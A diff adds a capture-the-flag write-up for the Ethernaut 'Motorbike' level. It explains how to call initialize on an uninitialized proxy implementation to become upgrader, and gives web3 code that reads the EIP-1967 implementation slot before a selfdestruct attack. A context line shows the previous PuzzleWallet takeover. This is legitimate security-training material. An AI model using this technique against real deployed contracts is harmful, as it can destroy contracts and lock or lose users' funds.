@@ -304,3 +304,27 @@ await contract.execute(player, 2*contractBalance, []);
 // become admin of PuzzleProxy, because storage slot overlaps with maxBalance of PuzzeWallet
 await contract.setMaxBalance(player);
 ```
+
+
+## 25. Motorbike
+
+In order to destroy the `Engine` contract via a `delegatecall` to a function that contains `selfdestruct`, we need to become the `upgrader` first to be allowed to call `upgradeToAndCall`.
+Becoming the `upgrader` is only possible by calling `initialize`. Unfortunately, the `Engine` contract is already initialized in the (storage) context of the `Motorbike` proxy contract.
+But it turns out that the `Engine` contract is not initialized in its own (storage) context.
+Therefore, we just need to find out the contract address and call `initialize` to make out attack work.
+
+
+Web3 code to get implementation address from proxy contract:
+```
+// compute implementation slot according to proxy contract
+const engineImplementationSlot = web3.utils.toBN(web3.utils.soliditySha3("eip1967.proxy.implementation")).sub(web3.utils.toBN(1));
+
+// read implementation address from proxy contract
+const engineImplementation = await web3.eth.getStorageAt(instance, engineImplementationSlot);
+
+// remove leading zeros to get 20 byte address
+const engineAddress = "0x" + engineImplementation.slice(26);
+```
+
+Compile [EngineDestructor.sol](./solutions/EngineDestructor.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
+Afterwards, just call the `destroy(address _engineContract)` function with the found `engineAddress` as first argument.
